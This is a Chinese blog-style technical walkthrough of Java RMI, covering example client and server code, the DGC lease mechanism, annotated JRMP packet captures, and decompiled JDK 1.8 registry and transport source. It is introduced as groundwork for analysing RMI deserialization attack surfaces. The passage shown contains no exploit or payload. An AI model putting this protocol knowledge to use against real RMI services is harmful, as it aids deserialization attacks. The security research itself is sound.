在分布式应用场景中，会经常使用到一个概念，叫`RPC`（远程方法调用协议）。它的目的是让一台机器可以向另一台机器发出请求，协助计算一个任务并返回计算结果。`RMI`是`Java`语言中，一种实现`RPC`的方式，完全由`Java`语言编写，在`TCP`之上使用`Java Remote Method Protocol(JRMP)`协议进行传输。由于采用的是自己设计的协议，它的缺点是只支持Java语言。
后续为了能够让其它语言也能与`RMI`对象进行交互，`Java`开始支持`CORBA`架构下的`IIOP`协议，并由此引出了名为`RMI-IIOP`的概念。这里只是顺带一提，不细究。
它和其他的`RPC`实现方式都是类似的，主要由`3`个部分组成。

- `Client`（客户端）
- `Registry`（注册中心）
- `Server`（服务端）

详细的实现结构见下图
![](https://cdn.nlark.com/yuque/0/2022/gif/22838900/1662625644738-029d33f0-ab87-464d-946e-3be59c14c6b8.gif#clientId=u468b1646-ec96-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=u2677831c&margin=%5Bobject%20Object%5D&originHeight=214&originWidth=403&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=shadow&taskId=u9aa48e28-7ea6-46e0-805d-49556dd04a0&title=)
`RMI`的调用过程会借助名为`Stub`和`Skel`的结构，它们可以看作是`Client`与`Server`沟通的代理。
`RPC`的实现方式一般为，服务端向注册中心注册自己开放的计算服务，可以简单的理解为一个方法或函数。客户端在需要使用时，先访问注册中心，查找是否有自己需要的计算服务，成功获取需要的信息后再去访问`Server`。
下面先看`Java`中`RMI`的代码示例，`Java`中的`RMI`是以接口的形式来提供远程调用服务的。
# 快速开始
## Server
服务端通过接口`RemoteService`提供如下方法调用，注意需要继承`java.rmi.Remote`接口，类似`Serializable`接口用于标识。
```java
public interface RemoteService extends java.rmi.Remote{
    public void doSome(String msg) throws RemoteException;
}
```
它的实现如下，需要继承`UnicastRemoteObject`类
```java
public class RemoteServiceImpl extends UnicastRemoteObject
        implements RemoteService {
    @Override
    public void doSome(String msg) throws RemoteException {
        System.out.println(msg);
    }
}
```
下面`Server`需要做的事将这个待开放的服务注册到`Registry`，下面的代码意味着`Server`和`Registry`位于同一台机器。
```java
public class OrdinaryRMIServer {

    public void startListener(String name, Object obj) throws RemoteException, AlreadyBoundException {
        Registry reg = LocateRegistry.createRegistry(9099);
        // If the obj has no extens the UnicastRemoteObject, call exportObject
        // to return a stub
        if (!(obj instanceof UnicastRemoteObject)) {
           obj = UnicastRemoteObject.exportObject((Remote) obj);
        }
        reg.bind(name, (Remote) obj);
    }

    public static void main(String[] args) {
        try {
            OrdinaryRMIServer rs = new OrdinaryRMIServer();
            // Construct a remote server obj
            RemoteServiceImpl rsi = new RemoteServiceImpl();
            // binding to registry
            rs.startListener("server", rsi);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
```
这段代码首先创建一个`Registry`，并将实例化的`RemoteServiceImpl`对象绑定至`Registry`，与名称`server`进行关联。类似`Map`，这样`Client`可以通过这个`key`值到`Registry`中查找。
> 看不懂的注释可以先跳过，后续会提到相关内容。

## Client
对于客户端而言要访问到刚才服务端注册到服务，首先它需要知道接口`RemoteService`的信息。也就是客户端也有如下代码
```java
public interface RemoteService extends java.rmi.Remote{
    public void doSome(String msg) throws RemoteException;
}
```
接着它需要使用`key`值`server`，到目标`Registry`中查找对应的服务。
```java
public class OrdinaryRMIClient {

    public void callRemote(String name) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
        RemoteService rs = (RemoteService) registry.lookup(name);

        rs.doSome("call rmi server.");
    }

    public static void main(String[] args) {
        try {
            OrdinaryRMIClient rc = new OrdinaryRMIClient();

            rc.callRemote("server");
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }
}
```
在成功获取到一个`RemoteService`对象后，即可调用这个接口提供的方法。从代码的角度来看，`RMI`是基于接口来提供服务的。
# 流程
下面是一个简化的调用流程，作者画的不错，就直接拿来用了。
![出自https://paper.seebug.org/1251/](https://cdn.nlark.com/yuque/0/2022/jpeg/22838900/1662452957859-9bb81a92-3ff4-4f4e-be36-f89d4b7cec85.jpeg#clientId=ud74ad851-13c7-4&crop=0&crop=0&crop=1&crop=1&from=paste&id=uc269835d&margin=%5Bobject%20Object%5D&originHeight=637&originWidth=1507&originalType=url&ratio=1&rotation=0&showTitle=true&status=done&style=shadow&taskId=u1fd05009-c709-4a98-9e9f-b90ab23e24f&title=%E5%87%BA%E8%87%AAhttps%3A%2F%2Fpaper.seebug.org%2F1251%2F "出自https://paper.seebug.org/1251/")
在`TCP`之上，`RMI`借助`JRMP`协议进行沟通，工作过程如下

- `RemoteService`接口的实现`RemoteServiceImpl`先继承`UnicastRemoteObject`类
   - `RemoteServiceImpl`对外暴露，等待外部RMI的访问
   - 暴露后会监听指定端口
   - 将自身注册至`Registry`
   - 一个`Client`从`Registry`获取`RemoteServiceImpl`的访问信息
   - `Client`使用获取的信息，访问`RemoteServiceImpl`
- 当`Client`向`RemoteServiceImpl`发起远程调用请求后，它会创建一个`TCPConnection`对象，并与`RemoteServiceImpl`的指定端口连接。发送`RMI header`以及通过`StreamRemoteCall`发送序列化后的调用参数
- `RemoteServiceImpl`
   - `Server`通过新的线程来处理与`Client`的连接，并继续等待其它连接。
   - 读取`RMI header`信息并创建`RemoteCall`对象来处理传递过来的参数，并进行反序列化
   - `Transport`的`serviceCall()`会根据请求内容的不同，进行分发
   - `dispatch()`会调用合适的方法来处理对应的请求内容，并进行响应
   - 如果方法调用过程种出现异常，会将其序列化后传递给`Client`
- `Client`
   - 从`Server`获取返回内容后，会进行反序列化

在分析源码的内容时，发现整个`TCP`通信过程比我想的要**复杂**一些。因为其中涉及到`[Distributed Garbage Collection(DGC)](https://www.ibm.com/docs/en/sdk-java-technology/8?topic=iiop-understanding-distributed-garbage-collection)`的交互过程，是第一次见，有些陌生。这部分的交互是否可以利用，我还没有研究，先从理解的角度来看完整的通信过程。以下过程基于前面的示例代码
> `[Distributed Garbage Collection(DGC)](https://www.ibm.com/docs/en/sdk-java-technology/8?topic=iiop-understanding-distributed-garbage-collection)`是RMI种内嵌的一种资源回收方案。这里将原文内容进行翻译说明：
> `RMI`系统基于`DGC`实现引用计数功能，用于管理远程服务对象，在前面的示例中，就是`RemoteServiceImpl`的代理类，类型为`Remote`。
> 当客户端通过反序列化创建了一个对`Remote`的引用对象时，它会远程调用服务端`DGC`的`dirty()`方法。当客户端完成了对远程`Remote`方法的调用，需要将其释放，相应的它会调用服务端`DGC`的`clean()`。客户端对服务端`DGC`的调用是借助后面提到的`DGCImpl_Stub`和`DGCImpl_Skel`。
> 为什么需要回收呢？
> 客户端获取的`Remote`的引用对象只是租用一段时间，当它使用完成后，需要释放。租期从调用`dirty()`方法后开始计算，如果想续租，必须在到期前再次调用`dirty()`方法。如果在到期前没有续租，`DGC`认为该`Remote`对象不再被客户端持有。
> `DGCClient`类实现了`DGC`在客户端中所需使用的方法。它对外提供了`registerRefs`方法，当获取了`Remote`对象的引用后（由`LiveRef`封装）会调用`registerRefs`方法来完成注册。当该引用对象第一次被获取时，会调用`dirty()`与服务端的`DGC`进行通信，表示开始租用该对象。该调用会返回一个`lease`，表示同意租用一段时间。`DGCClient`会跟踪本地已注册的`LiveRef`实例，当该实例在客户端被垃圾回收后会调用`clean()`方法通知服务端的`DGC`，表示自身不再需要使用它。`RenewCleanThread`实例会异步与服务端`DGC`通信维持`LiveRef`的租用期，并在需要时调用`clean()`。

分析分为两个步骤，交错着来看

- 先看`Server`的行为
- 再看`Client`的行为

首先这个示例，`Registry`和`Server`是在一起的，在调用`createRegistry`后，`Registry`会在本地监听`9099`端口。之后调用`UnicastRemoteObject._exportObject_((Remote) obj, 0)`（如果`obj`未继承`UnicastRemoteObject`的话），将期望对外开发的服务对外暴露出来，这里可以将`0`替换为期望监听的端口，否则将为随机端口。
创建`Registry`时，有如下主要步骤

- 创建`RegistryImpl_Stub`和`RegistryImpl_Skel`对象
- 监听`9099`端口
- 调用`ObjectTable#_putTarget_()`，将由`RegistryImpl_Stub`和`RegistryImpl_Skel`创建的`Target`对象放入全局`ObjectTable._objTable_`和`ObjectTable._implTable_`

由于`RemoteServiceImpl`已经继承了`UnicastRemoteObject`，所以在调用其构造函数时，就已经将服务暴露在随机端口了。这个过程主要做完成如下工作

- 创建`RemoteServiceImpl`的代理类，`handler`为`RemoteObjectInvocationHandler`
- 调用`TCPTransport#_listen_()`进行监听
- 调用`ObjectTable#_putTarget_()`，将与`RemoteServiceImpl`相关的Target对象，放入全局`ObjectTable._objTable_`和`ObjectTable._implTable_`
- 执行`DGCImpl`的静态代码块，创建`DGCImpl_Stub`和`DGCImpl_Skel`，并调用`ObjectTable#_putTarget_()`。

最后将服务绑定注册至`Registry`，并与`server`这个名称进行关联

- 将`RemoteServiceImpl`的代理类放入`RegistryImpl.bindings`

对于`Client`
先获取调用`LocateRegistry._getRegistry()_`

- 获取`RegistryImpl_Stub`实例

获取`RemoteService`对象

- 调用`UnicastRef#_newCall()_`与`Registry`创建连接，并创建`StreamRemoteCall`实例
- 调用`StreamRemoteCall#_executeCall()_`与`Registry`进行交互，之后从`Registry`的响应中获得`Remote`对象，此时获取的为`RemoteServiceImpl`的代理类
- 调用`StreamRemoteCall#releaseInputStream_()->_ConnectionInputStream_#registerRefs()_->DGCClient#_registerRefs()_`将获取的`Remote`对象进行注册
- 调用`DGCClient$EndpointEntry#makeDirtyCall_()_`，并通过`DGCImpl_Stub`向服务端`DGC`发起`dirty()`调用，表示租赁当前获取的`Remote`对象了
## 协议分析
看完了前面的大致流程，下面对通信过程抓包进行分析。
由于`Server`和`Registry`位于同一台机器，且是通过`createRegistry`后调用`bind`绑定的接口，所以整个通讯过程不包含`bind`相关的内容。
抓取的数据包分为两个数据流，`Client`与`Registry`的通信，获取`Remote`对象，以及`Client(Stub)`和`Server(Skel)`对象的通信。
`Client`与`Registry`的通信过程如下（`lookup`）
```
# Client -> Registry
00000000  4a 52 4d 49 00 02 4b                               JRMI..K
4a 52 4d 49 -> header: JRMI
00 02       -> version: 2
4b          -> protocol: StreamProtocol
# Registry -> Client
00000000  4e 00 09 31 32 37 2e 30  2e 30 2e 31 00 00 c3 f1   N..127.0 .0.1....
4e          -> ProtocolAck
00 09 31 32 37 2e 30  2e 30 2e 31 -> registry ip
00 00 c3 f1 -> client port
# Client -> Registry
00000007  00 0e 31 30 2e 31 32 38  2e 31 35 34 2e 31 35 31   ..10.128 .154.151
00000017  00 00 00 00                                        ....
0000001B  50 ac ed 00 05 77 22 00  00 00 00 00 00 00 00 00   P....w". ........
0000002B  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........
0000003B  02 44 15 4d c9 d4 e6 3b  df 74 00 06 73 65 72 76   .D.M...; .t..serv
0000004B  65 72                                              er
00 0e 31 30 2e 31 32 38  2e 31 35 34 2e 31 35 31 -> client ip: 10.128.154.151
00 00 00 00 -> unknown
50          -> Call
ac ed 00 05 -> serialization header
77          -> TC_BLOCKDATA
22 
00 00 00 00 00 00 00 00 -> id num
00 00 00 00 -> UID 
```
`Client(Stub)`和`Server(Skel)`对象的通信过程如下
前半部分包括的流量涉及`DGC`交互
```
# DGCImpl_Stub -> DGCImpl_Skel
00000000  4a 52 4d 49 00 02 4b                               JRMI..K
4a 52 4d 49 -> header: JRMI
00 02       -> version: 2
4b          -> protocol: StreamProtocol
# DGCImpl_Skel -> DGCImpl_Stub
00000000  4e 00 0e 31 30 2e 31 32  38 2e 31 35 34 2e 31 35   N..10.12 8.154.15
00000010  31 00 00 c3 f2                                     1....
4e          -> ProtocolAck
00 0e 31 30 2e 31 32 38 2e 31 35 34 2e 31 35 -> stub ip: 10.128.154.151
00 00 c3 f2 -> client port: 50162
# DGCImpl_Stub -> DGCImpl_Skel
# DGC Request, call dirty()
00000007  00 0e 31 30 2e 31 32 38  2e 31 35 34 2e 31 35 31   ..10.128 .154.151
00000017  00 00 00 00                                        ....
0000001B  50 ac ed 00 05 77 22 00  00 00 00 00 00 00 02 00   P....w". ........
0000002B  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........
0000003B  01 f6 b6 89 8d 8b f2 86  43 75 72 00 18 5b 4c 6a   ........ Cur..[Lj
0000004B  61 76 61 2e 72 6d 69 2e  73 65 72 76 65 72 2e 4f   ava.rmi. server.O
0000005B  62 6a 49 44 3b 87 13 00  b8 d0 2c 64 7e 02 00 00   bjID;... ..,d~...
0000006B  70 78 70 00 00 00 01 73  72 00 15 6a 61 76 61 2e   pxp....s r..java.
0000007B  72 6d 69 2e 73 65 72 76  65 72 2e 4f 62 6a 49 44   rmi.serv er.ObjID
0000008B  a7 5e fa 12 8d dc e5 5c  02 00 02 4a 00 06 6f 62   .^.....\ ...J..ob
0000009B  6a 4e 75 6d 4c 00 05 73  70 61 63 65 74 00 15 4c   jNumL..s pacet..L
000000AB  6a 61 76 61 2f 72 6d 69  2f 73 65 72 76 65 72 2f   java/rmi /server/
000000BB  55 49 44 3b 70 78 70 cd  36 56 63 30 ac 24 bc 73   UID;pxp. 6Vc0.$.s
000000CB  72 00 13 6a 61 76 61 2e  72 6d 69 2e 73 65 72 76   r..java. rmi.serv
000000DB  65 72 2e 55 49 44 0f 12  70 0d bf 36 4f 12 02 00   er.UID.. p..6O...
000000EB  03 53 00 05 63 6f 75 6e  74 4a 00 04 74 69 6d 65   .S..coun tJ..time
000000FB  49 00 06 75 6e 69 71 75  65 70 78 70 80 01 00 00   I..uniqu epxp....
0000010B  01 83 15 a2 f1 55 7a ee  ac e6 77 08 80 00 00 00   .....Uz. ..w.....
0000011B  00 00 00 00 73 72 00 12  6a 61 76 61 2e 72 6d 69   ....sr.. java.rmi
0000012B  2e 64 67 63 2e 4c 65 61  73 65 b0 b5 e2 66 0c 4a   .dgc.Lea se...f.J
0000013B  dc 34 02 00 02 4a 00 05  76 61 6c 75 65 4c 00 04   .4...J.. valueL..
0000014B  76 6d 69 64 74 00 13 4c  6a 61 76 61 2f 72 6d 69   vmidt..L java/rmi
0000015B  2f 64 67 63 2f 56 4d 49  44 3b 70 78 70 00 00 00   /dgc/VMI D;pxp...
0000016B  00 00 09 27 c0 73 72 00  11 6a 61 76 61 2e 72 6d   ...'.sr. .java.rm
0000017B  69 2e 64 67 63 2e 56 4d  49 44 f8 86 5b af a4 a5   i.dgc.VM ID..[...
0000018B  6d b6 02 00 02 5b 00 04  61 64 64 72 74 00 02 5b   m....[.. addrt..[
0000019B  42 4c 00 03 75 69 64 71  00 7e 00 03 70 78 70 75   BL..uidq .~..pxpu
000001AB  72 00 02 5b 42 ac f3 17  f8 06 08 54 e0 02 00 00   r..[B... ...T....
000001BB  70 78 70 00 00 00 08 23  d3 cc d9 02 62 7d 74 73   pxp....# ....b}ts
000001CB  71 00 7e 00 05 80 01 00  00 01 83 15 a4 15 6b 91   q.~..... ......k.
000001DB  79 b1 c1                                           y..
00 0e 31 30 2e 31 32 38  2e 31 35 34 2e 31 35 31 -> Stub ip: 10.128.154.152
00 00 00 00 -> unknown
50          -> Call
# 后续内容为序列化后的调用数据
ac ed 00 05 -> serialization header
77          -> TC_BLOCKDATA
22
00 00 00 00 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 -> ObjID
00 00 00 01 -> operation_id
f6 b6 89 8d 8b f2 86 43 -> DGCImpl_Stub_interfaceHash
75          -> TC_ARRAY
# DGCImpl_Skel -> DGCImpl_Stub
# DGC Response
00000015  51 ac ed 00 05 77 0f 01  7a ee ac e6 00 00 01 83   Q....w.. z.......
00000025  15 a2 f1 55 80 03 73 72  00 12 6a 61 76 61 2e 72   ...U..sr ..java.r
00000035  6d 69 2e 64 67 63 2e 4c  65 61 73 65 b0 b5 e2 66   mi.dgc.L ease...f
00000045  0c 4a dc 34 02 00 02 4a  00 05 76 61 6c 75 65 4c   .J.4...J ..valueL
00000055  00 04 76 6d 69 64 74 00  13 4c 6a 61 76 61 2f 72   ..vmidt. .Ljava/r
00000065  6d 69 2f 64 67 63 2f 56  4d 49 44 3b 70 78 70 00   mi/dgc/V MID;pxp.
00000075  00 00 00 00 09 27 c0 73  72 00 11 6a 61 76 61 2e   .....'.s r..java.
00000085  72 6d 69 2e 64 67 63 2e  56 4d 49 44 f8 86 5b af   rmi.dgc. VMID..[.
00000095  a4 a5 6d b6 02 00 02 5b  00 04 61 64 64 72 74 00   ..m....[ ..addrt.
000000A5  02 5b 42 4c 00 03 75 69  64 74 00 15 4c 6a 61 76   .[BL..ui dt..Ljav
000000B5  61 2f 72 6d 69 2f 73 65  72 76 65 72 2f 55 49 44   a/rmi/se rver/UID
000000C5  3b 70 78 70 75 72 00 02  5b 42 ac f3 17 f8 06 08   ;pxpur.. [B......
000000D5  54 e0 02 00 00 70 78 70  00 00 00 08 23 d3 cc d9   T....pxp ....#...
000000E5  02 62 7d 74 73 72 00 13  6a 61 76 61 2e 72 6d 69   .b}tsr.. java.rmi
000000F5  2e 73 65 72 76 65 72 2e  55 49 44 0f 12 70 0d bf   .server. UID..p..
00000105  36 4f 12 02 00 03 53 00  05 63 6f 75 6e 74 4a 00   6O....S. .countJ.
00000115  04 74 69 6d 65 49 00 06  75 6e 69 71 75 65 70 78   .timeI.. uniquepx
00000125  70 80 01 00 00 01 83 15  a4 15 6b 91 79 b1 c1      p....... ..k.y..
# Stub -> Skel
000001DE  52                                                 R
52          -> Ping
# Skel -> Stub
00000134  53                                                 S
53          -> PingAck
# Stub -> Skel
# 调用过程
000001DF  50 ac ed 00 05 77 22 cd  36 56 63 30 ac 24 bc 7a   P....w". 6Vc0.$.z
000001EF  ee ac e6 00 00 01 83 15  a2 f1 55 80 01 ff ff ff   ........ ..U.....
000001FF  ff ac 6d d7 ac 6e 46 d7  4f 74 00 10 63 61 6c 6c   ..m..nF. Ot..call
0000020F  20 72 6d 69 20 73 65 72  76 65 72 2e                rmi ser ver.
# Skel -> Stub
00000135  51 ac ed 00 05 77 0f 01  7a ee ac e6 00 00 01 83   Q....w.. z.......
00000145  15 a2 f1 55 80 04                                  ...U..

```

# 攻击面分析
这里以反序列化漏洞利用的视角，来看看曾在RMI协议中暴露的利用点。以`jdk1.8.65`为例进行源码分析，示例代码同上。先来看注册中心的创建和获取

- public static Registry createRegistry(int port) throws RemoteException;
- public static Registry getRegistry(String host, int port)  throws RemoteException;

它们虽然有多个重载方法，但底层逻辑类似，所以就以这两个为例进行分析了。先来看`createRegistry`，整个过程稍长
## createRegistry
```java
public static Registry createRegistry(int port) throws RemoteException {
    return new RegistryImpl(port);
}
```
调用`RegistryImpl`构造函数
```java
public RegistryImpl(final int var1) throws RemoteException {
    if (var1 == 1099 && System.getSecurityManager() != null) {
        try {
            AccessController.doPrivileged(new PrivilegedExceptionAction<Void>() {
                public Void run() throws RemoteException {
                    LiveRef var1x = new LiveRef(RegistryImpl.id, var1);
                    RegistryImpl.this.setup(new UnicastServerRef(var1x));
                    return null;
                }
            }, null, new SocketPermission("localhost:" + var1, "listen,accept"));
        } catch (PrivilegedActionException var3) {
            throw (RemoteException)var3.getException();
        }
    } else {
        LiveRef var2 = new LiveRef(id, var1);
        this.setup(new UnicastServerRef(var2));
    }

}
```
先忽略`SecurityManager`，进到`this.setup`看看
```java
private void setup(UnicastServerRef var1) throws RemoteException {
    this.ref = var1;
    var1.exportObject(this, null, true);
}
```
继续来到`UnicastServerRef#exportObject`
```java
public Remote exportObject(Remote var1, Object var2, boolean var3) throws RemoteException {
    Class var4 = var1.getClass();

    Remote var5;
    try {
        var5 = Util.createProxy(var4, this.getClientRef(), this.forceStubUse);
    } catch (IllegalArgumentException var7) {
        throw new ExportException("remote object implements illegal remote interface", var7);
    }

    if (var5 instanceof RemoteStub) {
        this.setSkeleton(var1);
    }

    Target var6 = new Target(var1, this, var5, this.ref.getObjID(), var3);
    this.ref.exportObject(var6);
    this.hashToMethod_Map = (Map)hashToMethod_Maps.get(var4);
    return var5;
}
```
这里先调用`Util.createProxy(var4, this.getClientRef(), this.forceStubUse)`创建一个`Remote`接口的代理对象，它的主要作用就是通过反射机制创建一个`RegistryImpl_Stub`对象，和`RegistryImpl_Skel`对象。相关代码如下
```java
private static RemoteStub createStub(Class<?> var0, RemoteRef var1) throws StubNotFoundException {
    String var2 = var0.getName() + "_Stub";

    try {
        Class var3 = Class.forName(var2, false, var0.getClassLoader());
        Constructor var4 = var3.getConstructor(stubConsParamTypes);
        return (RemoteStub)var4.newInstance(var1);
    } 
    // more code ...
}
```
之后创建`Target`对象，并调用`LiveRef#exportObject`导出该对象，一路来到`TCPTransport#exportObject`
```java
public void exportObject(Target var1) throws RemoteException {
    synchronized(this) {
        this.listen();
        ++this.exportCount;
    }

    boolean var2 = false;

    try {
        super.exportObject(var1);
        var2 = true;
    } finally {
        if (!var2) {
            synchronized(this) {
                this.decrementExportCount();
            }
        }

    }
}
```
所谓导出就是将创建的`Target`对象（与`Stub`关联）放入全局`ObjectTable`中，便于后续使用。同时，调用`this.listen`开启监听，等待连接的接入。
```java
private void listen() throws RemoteException {
    assert Thread.holdsLock(this);

    TCPEndpoint var1 = this.getEndpoint();
    int var2 = var1.getPort();
    if (this.server == null) {
        if (tcpLog.isLoggable(Log.BRIEF)) {
            tcpLog.log(Log.BRIEF, "(port " + var2 + ") create server socket");
        }

        try {
            this.server = var1.newServerSocket();
            Thread var3 = (Thread)AccessController.doPrivileged(new NewThreadAction(new TCPTransport.AcceptLoop(this.server), "TCP Accept-" + var2, true));
            var3.start();
        } catch (BindException var4) {
            throw new ExportException("Port already in use: " + var2, var4);
        } catch (IOException var5) {
            throw new ExportException("Listen failed on port: " + var2, var5);
        }
    } else {
        SecurityManager var6 = System.getSecurityManager();
        if (var6 != null) {
            var6.checkListen(var2);
        }
    }
}
```
创建新的线程并调用`TCPTransport.AcceptLoop#run`方法，其中会执行`TCPTransport.AcceptLoop#executeAcceptLoop`
```java
private void executeAcceptLoop() {
    if (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) {
        TCPTransport.tcpLog.log(Log.BRIEF, "listening on port " + TCPTransport.this.getEndpoint().getPort());
    }

    while(true) {
        Object var1 = null;

        try {
            Socket var16 = this.serverSocket.accept();
            InetAddress var17 = var16.getInetAddress();
            String var3 = var17 != null ? var17.getHostAddress() : "0.0.0.0";

            try {
                TCPTransport.connectionThreadPool.execute(TCPTransport.this.new ConnectionHandler(var16, var3));
            } catch (RejectedExecutionException var11) {
                TCPTransport.closeSocket(var16);
                TCPTransport.tcpLog.log(Log.BRIEF, "rejected connection from " + var3);
            }
        } catch (Throwable var15) {
            Throwable var2 = var15;

            try {
                if (this.serverSocket.isClosed()) {
                    return;
                }

                try {
                    if (TCPTransport.tcpLog.isLoggable(Level.WARNING)) {
                        TCPTransport.tcpLog.log(Level.WARNING, "accept loop for " + this.serverSocket + " throws", var2);
                    }
                } catch (Throwable var13) {
                }
            } finally {
                if (var1 != null) {
                    TCPTransport.closeSocket((Socket)var1);
                }

            }

            if (!(var15 instanceof SecurityException)) {
                try {
                    TCPEndpoint.shedConnectionCaches();
                } catch (Throwable var12) {
                }
            }

            if (!(var15 instanceof Exception) && !(var15 instanceof OutOfMemoryError) && !(var15 instanceof NoClassDefFoundError)) {
                if (var15 instanceof Error) {
                    throw (Error)var15;
                }

                throw new UndeclaredThrowableException(var15);
            }

            if (!this.continueAfterAcceptFailure(var15)) {
                return;
            }
        }
    }
}
```
对于每个`Client`到来的连接，通过线程池，交由`TCPTransport.ConnectionHandler#run`处理，此方法会进一步调用`TCPTransport.ConnectionHandler#run0`
```java
private void run0() {
    TCPEndpoint var1 = TCPTransport.this.getEndpoint();
    int var2 = var1.getPort();
    TCPTransport.threadConnectionHandler.set(this);

    try {
        this.socket.setTcpNoDelay(true);
    } catch (Exception var31) {
    }

    try {
        if (TCPTransport.connectionReadTimeout > 0) {
            this.socket.setSoTimeout(TCPTransport.connectionReadTimeout);
        }
    } catch (Exception var30) {
    }

    try {
        InputStream var3 = this.socket.getInputStream();
        Object var4 = var3.markSupported() ? var3 : new BufferedInputStream(var3);
        ((InputStream)var4).mark(4);
        DataInputStream var5 = new DataInputStream((InputStream)var4);
        int var6 = var5.readInt();
        if (var6 == 1347375956) {
            TCPTransport.tcpLog.log(Log.BRIEF, "decoding HTTP-wrapped call");
            ((InputStream)var4).reset();

            try {
                this.socket = new HttpReceiveSocket(this.socket, (InputStream)var4, null);
                this.remoteHost = "0.0.0.0";
                var3 = this.socket.getInputStream();
                var4 = new BufferedInputStream(var3);
                var5 = new DataInputStream((InputStream)var4);
                var6 = var5.readInt();
            } catch (IOException var29) {
                throw new RemoteException("Error HTTP-unwrapping call", var29);
            }
        }

        short var7 = var5.readShort();
        // 1246907721 -> 4A524A4D -> JRMI
        if (var6 == 1246907721 && var7 == 2) {
            OutputStream var8 = this.socket.getOutputStream();
            BufferedOutputStream var9 = new BufferedOutputStream(var8);
            DataOutputStream var10 = new DataOutputStream(var9);
            int var11 = this.socket.getPort();
            if (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) {
                TCPTransport.tcpLog.log(Log.BRIEF, "accepted socket from [" + this.remoteHost + ":" + var11 + "]");
            }

            byte var15 = var5.readByte();
            switch(var15) {
                case 75:
                    var10.writeByte(78);
                    if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) {
                        TCPTransport.tcpLog.log(Log.VERBOSE, "(port " + var2 + ") " + "suggesting " + this.remoteHost + ":" + var11);
                    }

                    var10.writeUTF(this.remoteHost);
                    var10.writeInt(var11);
                    var10.flush();
                    String var16 = var5.readUTF();
                    int var17 = var5.readInt();
                    if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) {
                        TCPTransport.tcpLog.log(Log.VERBOSE, "(port " + var2 + ") client using " + var16 + ":" + var17);
                    }

                    TCPEndpoint var36 = new TCPEndpoint(
                        this.remoteHost, this.socket.getLocalPort(), var1.getClientSocketFactory(), var1.getServerSocketFactory()
                    );
                    TCPChannel var38 = new TCPChannel(TCPTransport.this, var36);
                    TCPConnection var39 = new TCPConnection(var38, this.socket, (InputStream)var4, var9);
                    TCPTransport.this.handleMessages(var39, true);
                    return;
                case 76:
                    TCPEndpoint var35 = new TCPEndpoint(
                        this.remoteHost, this.socket.getLocalPort(), var1.getClientSocketFactory(), var1.getServerSocketFactory()
                    );
                    TCPChannel var37 = new TCPChannel(TCPTransport.this, var35);
                    TCPConnection var14 = new TCPConnection(var37, this.socket, (InputStream)var4, var9);
                    TCPTransport.this.handleMessages(var14, false);
                    return;
                case 77:
                    if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) {
                        TCPTransport.tcpLog.log(Log.VERBOSE, "(port " + var2 + ") accepting multiplex protocol");
                    }

                    var10.writeByte(78);
                    if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) {
                        TCPTransport.tcpLog.log(Log.VERBOSE, "(port " + var2 + ") suggesting " + this.remoteHost + ":" + var11);
                    }

                    var10.writeUTF(this.remoteHost);
                    var10.writeInt(var11);
                    var10.flush();
                    TCPEndpoint var12 = new TCPEndpoint(var5.readUTF(), var5.readInt(), var1.getClientSocketFactory(), var1.getServerSocketFactory());
                    if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) {
                        TCPTransport.tcpLog.log(Log.VERBOSE, "(port " + var2 + ") client using " + var12.getHost() + ":" + var12.getPort());
                    }

                    ConnectionMultiplexer var18;
                    synchronized(TCPTransport.this.channelTable) {
                        TCPChannel var13 = TCPTransport.this.getChannel(var12);
                        var18 = new ConnectionMultiplexer(var13, (InputStream)var4, var8, false);
                        var13.useMultiplexer(var18);
                    }

                    var18.run();
                    return;
                default:
                    var10.writeByte(79);
                    var10.flush();
                    return;
            }
        }

        TCPTransport.closeSocket(this.socket);
    } catch (IOException var32) {
        TCPTransport.tcpLog.log(Log.BRIEF, "terminated with exception:", var32);
        return;
    } finally {
        TCPTransport.closeSocket(this.socket);
    }

}
```
这部分涉及到`RMI`通讯协议的处理，这里先不过多涉及，只简单描述。获取连接的输入流后首先从读取前`4`个字节，判断是否为`HTTP`封装下的请求或者`JRMI`形式，这里关注`JRMI`的情况，即原生沟通方式。之后读取后面`2`个字节，为协议版本号。再读取一个字节的内容，这个字节表示协议具体采用的是哪种形式，由如下`3`中：

- _StreamProtocol: 0x4b_
- _SingleOpProtocol: 0x4c_
- _MultiplexProtocol: 0x4d_

这里关注第一种，可以看到向请求方发送了自己的`ip`地址，和一些标记。然后等待请求方发送的后续内容，也包括了`ip`地址。后续创建`TCPConnection`对象后，将后续连接内容交由`TCPTransport#handleMessages`方法处理
```java
void handleMessages(Connection var1, boolean var2) {
    int var3 = this.getEndpoint().getPort();

    try {
        DataInputStream var4 = new DataInputStream(var1.getInputStream());

        do {
            int var5 = var4.read();
            if (var5 == -1) {
                if (tcpLog.isLoggable(Log.BRIEF)) {
                    tcpLog.log(Log.BRIEF, "(port " + var3 + ") connection closed");
                }

                return;
            }

            if (tcpLog.isLoggable(Log.BRIEF)) {
                tcpLog.log(Log.BRIEF, "(port " + var3 + ") op = " + var5);
            }

            switch(var5) {
                case 80:
                    StreamRemoteCall var6 = new StreamRemoteCall(var1);
                    if (!this.serviceCall(var6)) {
                        return;
                    }
                    break;
                case 81:
                case 83:
                default:
                    throw new IOException("unknown transport op " + var5);
                case 82:
                    DataOutputStream var7 = new DataOutputStream(var1.getOutputStream());
                    var7.writeByte(83);
                    var1.releaseOutputStream();
                    break;
                case 84:
                    DGCAckHandler.received(UID.read(var4));
            }
        } while(var2);

    } catch (IOException var17) {
        if (tcpLog.isLoggable(Log.BRIEF)) {
            tcpLog.log(Log.BRIEF, "(port " + var3 + ") exception: ", var17);
        }

    } finally {
        try {
            var1.close();
        } catch (IOException var16) {
        }

    }
}
```
